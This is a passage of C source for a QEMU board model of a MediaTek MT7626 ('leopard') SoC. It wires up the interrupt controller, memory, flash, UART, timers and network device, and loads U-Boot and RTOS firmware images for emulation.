            [GTIMER_PHYS] = 14,  /* INTID 30 */
            [GTIMER_VIRT] = 11,  /* INTID 27 */
            [GTIMER_HYP]  = 10,  /* INTID 26 */
            [GTIMER_SEC]  = 13,  /* INTID 29 */
        };
        int num_spi = 256;   /* must cover GPT SPI 152, FE SPI 199 */
        int i;

        qdev_prop_set_uint32(gic, "num-irq", num_spi + GIC_INTERNAL);
        qdev_prop_set_uint32(gic, "revision", 2);
        qdev_prop_set_uint32(gic, "num-cpu", num_cpus);
        qdev_prop_set_bit(gic, "has-security-extensions", false);
        sysbus_realize_and_unref(gicbus, &error_fatal);
        sysbus_mmio_map_overlap(gicbus, 0, 0x10310000, 1);
        sysbus_mmio_map_overlap(gicbus, 1, 0x10320000, 1);

        for (n = 0; n < num_cpus; n++) {
            DeviceState *cpudev = DEVICE(cpus[n]);
            int ppibase = num_spi + n * GIC_INTERNAL + GIC_NR_SGIS;

            for (i = 0; i < ARRAY_SIZE(timer_ppi); i++) {
                qdev_connect_gpio_out(cpudev, i,
                    qdev_get_gpio_in(gic, ppibase + timer_ppi[i]));
            }
            sysbus_connect_irq(gicbus, n,
                               qdev_get_gpio_in(cpudev, ARM_CPU_IRQ));
            sysbus_connect_irq(gicbus, n + num_cpus,
                               qdev_get_gpio_in(cpudev, ARM_CPU_FIQ));
        }
    }

    /* DRAM */
    memory_region_init_ram(dram, NULL, "leopard.dram",
                           LEOPARD_DRAM_SIZE, &error_fatal);
    memory_region_add_subregion(sysmem, LEOPARD_DRAM_BASE, dram);

    nor_load_flash();

    /* Memory-mapped NOR flash window at 0x30000000 (16 MiB).
     * The flash file is a complete flash image:
     *   0x2F000: BOOTCFG partition (4KB)
     *   0x30000: firmware partition (TP-LINK image)
     * Map it 1:1 so flash_offset → XIP addr 0x30000000 + offset. */
    if (nor.flash && nor.flash_size) {
        MemoryRegion *flash_rom = g_new(MemoryRegion, 1);
        void *flash_buf;
        size_t rom_size = 16 * MiB;
        memory_region_init_rom(flash_rom, NULL, "leopard.nor-xip",
                               rom_size, &error_fatal);
        flash_buf = memory_region_get_ram_ptr(flash_rom);
        memset(flash_buf, 0xff, rom_size);
        memcpy(flash_buf, nor.flash,
               nor.flash_size < rom_size ? nor.flash_size : rom_size);
        memory_region_add_subregion(sysmem, 0x30000000, flash_rom);

        /* RTOS /flash0 driver hands out 0x9F000000 as the NOR XIP base
         * (legacy MIPS-KSEG1 convention; vendor reused the constant).
         * Alias the same backing so miniFsInit can read the MINIFS blob. */
        MemoryRegion *flash_alias = g_new(MemoryRegion, 1);
        memory_region_init_alias(flash_alias, NULL, "leopard.nor-xip-alias",
                                 flash_rom, 0, rom_size);
        memory_region_add_subregion(sysmem, 0x9F000000, flash_alias);
    }

    /* Catch-all RAM stub for the whole peripheral window 0x10000000..0x20000000.
     * Backed by RAM so read-after-write returns the written value.
     * UART/timer/NOR overlay on top with higher priority. */
    {
        MemoryRegion *mr = g_new(MemoryRegion, 1);
        memory_region_init_ram(mr, NULL, "leopard.periph-ram",
                               0x10000000, &error_fatal);
        memory_region_add_subregion(sysmem, 0x10000000, mr);
    }

    /* MTK GSW MDIO controller stub at 0x1B110000 */
    {
        MemoryRegion *mr = g_new(MemoryRegion, 1);
        memory_region_init_io(mr, NULL, &mdio_ops, NULL,
                              "leopard.mdio", 0x1000);
        memory_region_add_subregion_overlap(sysmem, MDIO_BASE, mr, 1);
    }

    /* NOR controller overlay at 0x11014000 with priority 1 */
    {
        MemoryRegion *mr = g_new(MemoryRegion, 1);
        memory_region_init_io(mr, NULL, &leopard_unmap_ops, NULL,
                              "leopard.nor-ctrl", NOR_SIZE);
        memory_region_add_subregion_overlap(sysmem, NOR_BASE, mr, 1);
    }

    /* Pre-seed sysctl chip ID register at 0x10000000.
     * The firmware reads the sysctl page on boot to identify the SoC.
     * Write a plausible MT7626/leopard chip revision value. */
    {
        uint32_t chip_id = 0x76260001; /* MT7626 revision 1 */
        address_space_write(&address_space_memory, 0x10000000,
                            MEMTXATTRS_UNSPECIFIED, &chip_id, 4);
        /* Also seed offset 0x08 (chip version) and 0x64 (bond_info) */
        uint32_t chip_ver = 0x00010000;
        address_space_write(&address_space_memory, 0x10000008,
                            MEMTXATTRS_UNSPECIFIED, &chip_ver, 4);
    }

    /* MT7626 CONNSYS / Wi-Fi EMI block.  Overlays the generic peripheral
     * RAM so wlanInit sees stable version/config IDs instead of zero. */
    {
        MemoryRegion *mr = g_new(MemoryRegion, 1);
        memory_region_init_io(mr, NULL, &leopard_connsys_ops, NULL,
                              "leopard.connsys", LEOPARD_CONNSYS_SIZE);
        memory_region_add_subregion_overlap(sysmem, LEOPARD_CONNSYS_BASE,
                                            mr, 1);
        if (gic) {
            const char *env = getenv("LEOPARD_WIFI_IRQ");
            int spi = (env && *env) ? (int)strtol(env, NULL, 0)
                                    : LEOPARD_WIFI_IRQ;

            connsys.irq = qdev_get_gpio_in(gic, spi);
            fprintf(stderr, "[leopard] CONNSYS/Wi-Fi IRQ -> GIC SPI %d\n",
                    spi);
        }
    }

    /* RAM-backed stub for DRAM controller area 0x1B000000..0x1B200000 */
    {
        MemoryRegion *mr = g_new(MemoryRegion, 1);
        memory_region_init_ram(mr, NULL, "leopard.dram-ctrl",
                               0x200000, &error_fatal);
        memory_region_add_subregion(sysmem, 0x1b000000, mr);
    }

    /* MTK GPT (overlays sysctrl-lo at 0x10004000). Six channels, one
     * shared IRQ on GIC SPI 152. */
    memory_region_init_io(timer, NULL, &leopard_timer_ops, NULL,
                          "leopard.timer", LEOPARD_TIMER_SIZE);
    memory_region_add_subregion_overlap(sysmem, LEOPARD_TIMER_BASE,
                                        timer, 1);
    for (n = 0; n < LEOPARD_GPT_NCHAN; n++) {
        gpt.ch[n].idx = n;
        gpt.ch[n].timer = timer_new_ns(QEMU_CLOCK_VIRTUAL,
                                       gpt_chan_cb, &gpt.ch[n]);
    }
    if (gic) {
        gpt.irq = qdev_get_gpio_in(gic, LEOPARD_GPT_IRQ);
    }

    /* 16550 UART — must overlay the periph-ram with higher priority */
    {
        DeviceState *dev = qdev_new(TYPE_SERIAL_MM);
        SysBusDevice *sbd = SYS_BUS_DEVICE(dev);
        qdev_prop_set_uint8(dev, "regshift", 2);
        qdev_prop_set_uint32(dev, "baudbase", 115200);
        qdev_prop_set_chr(dev, "chardev", serial_hd(0));
        qdev_prop_set_uint8(dev, "endianness", DEVICE_LITTLE_ENDIAN);
        sysbus_realize_and_unref(sbd, &error_fatal);
        sysbus_mmio_map_overlap(sbd, 0, LEOPARD_UART_BASE, 2);
        /* Wire UART0 IRQ to GIC SPI. SPI number is configurable via env
         * (LEOPARD_UART_IRQ) since we don't yet know the firmware's wiring;
         * default to SPI 51, a common MT76xx UART0 IRQ. */
        if (gic) {
            const char *env = getenv("LEOPARD_UART_IRQ");
            if (env) {
                int spi = (int)strtol(env, NULL, 0);
                sysbus_connect_irq(sbd, 0, qdev_get_gpio_in(gic, spi));
                fprintf(stderr, "[leopard] UART0 IRQ -> GIC SPI %d\n", spi);
            }
        }
    }

    /* MTK Frame Engine / PDMA at 0x1B100000 — NIC connected to user-net. */
    {
        DeviceState *dev = qdev_new(TYPE_LEOPARD_FE);
        SysBusDevice *sbd = SYS_BUS_DEVICE(dev);
        NICInfo *nd = qemu_find_nic_info(TYPE_LEOPARD_FE, true, NULL);
        if (nd) {
            qdev_set_nic_properties(dev, nd);
        }
        sysbus_realize_and_unref(sbd, &error_fatal);
        sysbus_mmio_map_overlap(sbd, 0, LEOPARD_FE_BASE, 2);
        if (gic) {
            sysbus_connect_irq(sbd, 0,
                               qdev_get_gpio_in(gic, LEOPARD_FE_IRQ));
        }
    }

    /* Image loading:
     *   -bios <uboot.bin>   : load LZMA-decompressed U-Boot at 0x41c00000
     *   -kernel <rtos.bin>  : load main system image at 0x40205000
     *   If both given, U-Boot is loaded too but PC starts at the RTOS.
     *   If only -bios, PC starts at U-Boot.
     */
    leopard_reset_pc = 0;
    if (machine->firmware) {
        if (load_image_targphys(machine->firmware,
                                LEOPARD_UBOOT_LOAD,
                                LEOPARD_DRAM_SIZE -
                                (LEOPARD_UBOOT_LOAD - LEOPARD_DRAM_BASE),
                                &error_fatal) < 0) {
            error_report("leopard: failed to load bios %s", machine->firmware);
            exit(1);
        }
        leopard_reset_pc = LEOPARD_UBOOT_LOAD;
    }
    if (machine->kernel_filename) {
        if (load_image_targphys(machine->kernel_filename,
                                LEOPARD_RTOS_LOAD,
                                LEOPARD_DRAM_SIZE -
                                (LEOPARD_RTOS_LOAD - LEOPARD_DRAM_BASE),
                                &error_fatal) < 0) {
            error_report("leopard: failed to load kernel %s",
                         machine->kernel_filename);
            exit(1);
        }
        leopard_reset_pc = LEOPARD_RTOS_LOAD;
    }
    if (!leopard_reset_pc) {
        error_report("leopard: pass -bios <uboot.bin> and/or -kernel <rtos.bin>");
        exit(1);
    }

    qemu_register_reset(leopard_cpu_reset, cpus[0]);

    /* Bump RTOS tick64 in DRAM via host timer (bypasses CPU IRQ-mask). */
    leopard_tick_timer = timer_new_ns(QEMU_CLOCK_VIRTUAL,
                                      leopard_tick_cb, NULL);
    timer_mod(leopard_tick_timer,
              qemu_clock_get_ns(QEMU_CLOCK_VIRTUAL) + 1000000);

    /* Start periodic I/O kick timer */
    leopard_io_kick_timer = timer_new_ns(QEMU_CLOCK_VIRTUAL,
                                         leopard_io_kick_cb, NULL);
    timer_mod(leopard_io_kick_timer,
              qemu_clock_get_ns(QEMU_CLOCK_VIRTUAL) + 1000000000);

    /* Start PC sampler */
    leopard_pc_sample_timer = timer_new_ns(QEMU_CLOCK_VIRTUAL,
                                           leopard_pc_sample_cb, NULL);
    timer_mod(leopard_pc_sample_timer,
              qemu_clock_get_ns(QEMU_CLOCK_VIRTUAL) + 100 * 1000 * 1000);

    /* Pre-create ARP send timer so the receive path can just timer_mod it. */
    leopard_arp_send_timer = timer_new_ns(QEMU_CLOCK_VIRTUAL,
                                          leopard_arp_send_cb, NULL);

    /* Stash a barebones boot info for completeness; arm_load_kernel is not
     * called because we are loading raw U-Boot, not a Linux kernel. */
    leopard_binfo.ram_size = LEOPARD_DRAM_SIZE;
    leopard_binfo.loader_start = LEOPARD_DRAM_BASE;
    leopard_binfo.board_id = -1;
}

static void leopard_machine_init(MachineClass *mc)
{
    mc->desc = "MediaTek/Airoha leopard (MT7626) bare-bones";
    mc->init = leopard_init;
    mc->max_cpus = 2;
    mc->default_cpus = 2;
    mc->default_cpu_type = ARM_CPU_TYPE_NAME("cortex-a7");
    mc->default_ram_size = LEOPARD_DRAM_SIZE;
    mc->no_floppy = 1;
    mc->no_cdrom = 1;
    mc->no_parallel = 1;
    mc->ignore_memory_transaction_failures = true;
}

DEFINE_MACHINE_ARM("leopard", leopard_machine_init)
